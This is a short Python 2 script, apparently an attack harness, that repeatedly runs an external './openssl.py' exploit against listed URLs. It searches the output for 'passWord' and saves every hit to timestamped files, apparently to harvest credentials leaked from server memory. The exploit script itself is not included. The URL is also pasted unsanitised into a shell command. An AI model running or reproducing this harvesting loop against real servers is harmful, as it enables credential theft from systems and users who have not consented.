import os
import re
import time
import threading
while True:
	Dict = ["url"]  #这里填写url
	for url in Dict:
		cmd = "python ./openssl.py "+url
		result = os.popen(cmd).read()  
		if result.find("passWord")>0:
			print url,time.asctime()
			with open('data_1\\' + time.asctime().replace(':', ' ') + '.txt', 'w') as f:
				f.write(result)
		time.sleep(1)